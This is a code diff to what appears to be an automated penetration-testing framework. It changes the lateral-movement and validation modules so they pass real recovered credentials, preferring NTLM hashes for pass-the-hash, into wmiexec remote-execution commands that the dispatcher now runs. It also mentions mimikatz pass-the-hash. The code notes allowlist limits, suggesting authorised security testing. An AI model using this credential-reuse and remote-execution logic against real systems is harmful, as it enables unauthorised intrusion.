@@ -135,25 +135,66 @@ class LateralMovement(AttackModule):
     required_cves: list[str] = []
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
+        # Phase 3: thread the actual recovered credential (Phase 1 added
+        # ctx.credentials) instead of '<recovered>' placeholders, and return
+        # script_generated so the dispatcher actually runs the lateral_exec
+        # command (status="info" is no longer counted as success since Phase 1).
+        cred = self._pick_credential(ctx)
+        if cred:
+            user = cred.get("username", "<recovered>")
+            if cred.get("ntlm_hash"):
+                auth = f"ntlm_hash='{cred['ntlm_hash']}'"
+            else:
+                auth = f"password='{cred.get('password', '<recovered>')}'"
+        else:
+            user = "<recovered>"
+            auth = "password='<recovered>'"
         return {
-            "status": "info",
+            "status": "script_generated",
             "module": self.name,
+            "script": (
+                f"lateral_exec(target_ip='{ctx.target_ip}', method='wmiexec', "
+                f"username='{user}', {auth}, command='whoami && hostname')"
+            ),
             "note": (
                 "Phase-level module: the orchestrator instantiates this for a vetted pivot "
                 "target that is already in the allowlist. It does NOT recurse -- "
-                "_phase_lateral_movement caps at max_pivot_depth and skips visited hosts."
+                "_phase_lateral_movement caps at max_pivot_depth and skips visited hosts. "
+                "Linux-attacker only (impacket); on Windows use mimikatz sekurlsa::pth."
             ),
-            "suggested_command": (
-                f"lateral_exec(target_ip='{ctx.target_ip}', method='psexec', "
-                f"username='<recovered>', password='<recovered>', command='whoami')"
-            ),
+            "evidence": [f"lateral movement to {ctx.target_ip} using recovered credential"],
+            "references": [
+                "https://www.thehacker.recipes/a-d/movement/ntlm/pth",
+                "https://github.com/fortra/impacket",
+            ],
             "workflow": [
                 "1. Use credentials recovered during exploitation (CredentialStore / dump_credentials).",
                 "2. Call lateral_exec against ctx.target_ip only (wmiexec/smbexec/psexec/atexec).",
                 "3. On success, record the new foothold; the orchestrator decides whether to recurse.",
             ],
-            "extra": {"phase_only": True},
+            "extra": {"phase_only": True, "allowlist_locked": True},
         }
+
+    @staticmethod
+    def _pick_credential(ctx: ModuleContext) -> dict[str, str] | None:
+        """Pick the most recent usable credential from ctx.credentials.
+
+        Entries may be dicts ({"username":..., "password":...} or
+        {"username":..., "ntlm_hash":...}) or flattened strings
+        ("user=admin password=x" from ModuleResult.to_dict). Prefer a hash
+        (pass-the-hash) over plaintext; prefer the last entry (most recent).
+        """
+        for entry in reversed(list(getattr(ctx, "credentials", None) or [])):
+            if isinstance(entry, dict):
+                if entry.get("username") and (entry.get("password") or entry.get("ntlm_hash")):
+                    return entry
+            elif isinstance(entry, str):
+                parts = dict(
+                    kv.split("=", 1) for kv in entry.split() if "=" in kv
+                )
+                if parts.get("username") and (parts.get("password") or parts.get("ntlm_hash")):
+                    return parts
+        return None
 
 
 class ValidateFinding(AttackModule):
@@ -164,18 +205,36 @@ class ValidateFinding(AttackModule):
     required_cves: list[str] = []
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
+        # Phase 3: script_generated (not info) so the dispatcher actually
+        # re-runs the verification -- status="info" is no longer counted as
+        # success since Phase 1, and the old info return made the orchestrator
+        # record a "success" for validation that never ran. The re-verification
+        # script prints a VALIDATED: marker (NOT a shell marker) so the
+        # classifier reads outcome=unknown and access_achieved is not re-flipped.
+        cred = LateralMovement._pick_credential(ctx)
+        if cred:
+            user = cred.get("username", "<recovered>")
+            if cred.get("ntlm_hash"):
+                auth = f"ntlm_hash='{cred['ntlm_hash']}'"
+            else:
+                auth = f"password='{cred.get('password', '<recovered>')}'"
+        else:
+            user = "<recovered>"
+            auth = "password='<recovered>'"
         return {
-            "status": "info",
+            "status": "script_generated",
             "module": self.name,
+            "script": (
+                f"lateral_exec(target_ip='{ctx.target_ip}', method='wmiexec', "
+                f"username='{user}', {auth}, command='whoami && hostname && ipconfig /all')"
+            ),
             "note": (
                 "Phase-level module: re-runs whoami/hostname/ipconfig on the compromised target "
                 "via lateral_exec to confirm the foothold is live and writes evidence. Targets "
-                "only ctx.target_ip."
+                "only ctx.target_ip. Returns success only when the re-verification reproduces "
+                "the claimed foothold; failed otherwise (feeds the retry decision)."
             ),
-            "suggested_command": (
-                f"lateral_exec(target_ip='{ctx.target_ip}', method='wmiexec', "
-                f"username='<recovered>', password='<recovered>', command='whoami && hostname && ipconfig /all')"
-            ),
+            "evidence": [f"re-verification queued against {ctx.target_ip}"],
             "workflow": [
                 "1. Re-run whoami/hostname/ipconfig on the compromised target via lateral_exec.",
                 "2. Confirm the returned user/host matches the claimed successful exploit.",
@@ -203,23 +262,28 @@ class LocalExploitSuggester(AttackModule):
     required_cves: list[str] = []
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
-        return {
-            "status": "info",
-            "module": self.name,
-            "note": (
+        return self._info_result(
+            ctx,
+            note=(
                 "Advisory: enumerate local privilege-escalation exploits via the MSF "
                 "local_exploit_suggester post module. Requires an existing meterpreter "
                 "session -- run msf_list_sessions to obtain the real session id, then "
                 "msf_run_recipe('local_exploit_suggester', session_id=<id>). This module "
-                "does NOT fabricate a session id."
+                "does NOT fabricate a session id. On Path B (no MSF session), ensure "
+                "KernelExploitCheck / LinuxPrivescCheck / WindowsPrivescCheck ran -- "
+                "those ARE dispatched and emit runnable scripts."
             ),
-            "suggested_command": (
+            evidence=[f"MSF local_exploit_suggester suggested for {ctx.target_ip} (session required)"],
+            references=[
+                "https://www.rapid7.com/db/modules/post/multi/recon/local_exploit_suggester/",
+            ],
+            suggested_command=(
                 "msf_run_recipe(name='local_exploit_suggester', session_id=<id from msf_list_sessions>)"
             ),
-            "workflow": [
+            workflow=[
                 "1. Confirm access_achieved and obtain the meterpreter session id (msf_list_sessions).",
                 "2. msf_run_recipe('local_exploit_suggester', session_id=<id>) to list candidate privesc modules.",
                 "3. Run a suggested module via msf_run_exploit / msf_run_post_module against the session.",
             ],
-            "extra": {"phase_only": True, "requires_session": True},
-        }
+            extra={"phase_only": True, "requires_session": True},
+        )
